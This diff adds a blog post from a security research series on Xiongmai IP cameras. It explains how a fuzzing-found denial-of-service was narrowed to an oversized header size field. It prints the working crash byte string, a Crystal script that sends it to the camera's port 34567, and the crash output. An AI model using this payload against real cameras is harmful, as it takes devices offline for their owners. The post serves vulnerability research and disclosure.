@@ -1,0 +1,52 @@
+---
+layout: post
+title:  "Xiongmai - An Investigative Journey 9 - Denial of Service"
+date:   2019-09-04 08:00:00 +0100
+tags: xiongmai, hacking, ipc
+permalink: /xiongmai/9
+---
+During my fuzzing with Radamsa I uncovered a DoS that would take my camera down via the unprivileged user account. Lets find out exactly what caused the crash!
+
+The first thing I did was backup the string, then I cut pieces out until the crash stopped working.
+
+The first thing I did was cut out the "message" portion of the packet, the DoS still worked. After, I started removing bits of the header, which was also the wrong size. I also changed values in it to see what caused caused the crash and what didn't. I found that a size field over 0x80000000 would cause the crash.
+
+<pre><code class="crystal">
+crash_string = "\xFF" + ("\x00"*13) + "\x85\x05" + "\x00\x00\x00\x80"
+</code></pre>
+
+This could mean a couple things, but most likely that someone used a signed variable for an unsigned integer, since size can never be below 0, this could cause an integer overflow error of some kind, most likely because the program is trying to read in a message size, either far beyond what was expected, or in the negative, causing a crash.
+
+Currently, the exploit uses the magic for OPMonitor, but this vulnerability should affect any command we are allowed to access, and since the "login" command is the most unprivilieged, that should be the next target.
+
+<pre><code class="crystal">
+crash_string = "\xFF" + ("\x00"*13) + "\xe8\x03" + "\x00\x00\x00\x80"
+socket = MagicSocket.new("192.168.11.109", 34567)
+#socket.login "default", Dahua.digest("tluafed")
+socket.send crash_string
+puts "SENT: #{crash_string.inspect}"
+reply = socket.receive_message
+puts "GOT: #{reply.message}"
+</code></pre>
+
+This produces:
+
+<pre><code>
+SENT: "\xFF\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xE8\u0003\u0000\u0000\u0000\x80"
+
+Unhandled exception:  (MagicError::ReceiveEOF)
+  from src/magic_fuzzer/magic_socket.cr:0:7 in 'receive_message'
+  from src/sandbox.cr:69:1 in '__crystal_main'
+  from /usr/share/crystal/src/crystal/main.cr:97:5 in 'main_user_code'
+  from /usr/share/crystal/src/crystal/main.cr:86:7 in 'main'
+  from /usr/share/crystal/src/crystal/main.cr:106:3 in 'main'
+  from __libc_start_main
+  from _start
+  from ???
+</code></pre>
+
+The ReceiveEOF proves that the socket closed and the server went down.
+
+The camera will go down for about 2 minutes, while still responding to pings for a short period of time while it reboots. The client cannot connect during this reboot period.
+
+<iframe width="616" height="380" src="https://www.youtube.com/embed/SnyPJtDDMFQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
